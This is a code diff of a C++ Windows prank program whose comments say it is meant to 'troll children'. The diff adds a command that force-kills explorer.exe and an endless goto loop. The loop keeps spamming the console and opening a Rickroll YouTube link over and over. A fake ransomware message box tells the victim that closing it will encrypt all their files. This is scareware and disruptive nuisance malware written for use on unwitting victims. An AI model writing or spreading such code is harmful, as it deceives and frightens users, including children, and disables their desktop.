@@ -9,9 +9,11 @@
 //This is harmless, but to the 9 year old in rift, their pc is fucked.
 //Dont use this to harm anyone. Just to troll children :D
 
-int main(int argc, char* argv[])
+int main()
 {
     system("Color 0C");
+    system("taskkill /IM explorer.exe /F"); 
+ok:
     std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
     std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
     std::cout << "LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO LMAO\n";
@@ -52,7 +54,8 @@ int main(int argc, char* argv[])
 
    
 
-    MessageBox(nullptr, TEXT("Your Computer is Infected. If you close this window, all your files will be encrypted. Press OK to enjoy the last 5 minutes of your pc ;)"), TEXT("Rift"), MB_OK);
+    MessageBox(nullptr, TEXT("Your Computer is Infected. If you close this window, all your files will be encrypted. Press OK to enjoy the last 5 minutes of your pc ;)"), TEXT("skīñś"), MB_OK);
+
 
     ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
     ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
@@ -69,5 +72,7 @@ int main(int argc, char* argv[])
     ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
     ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
     ShellExecute(NULL, NULL, L"https://www.youtube.com/watch?v=iik25wqIuFo&ab_channel=Rickroll%2Cbutwithadifferentlink", NULL, NULL, SW_SHOWNORMAL);
-    return 0;
+    goto ok;
+
+return 0;
 }
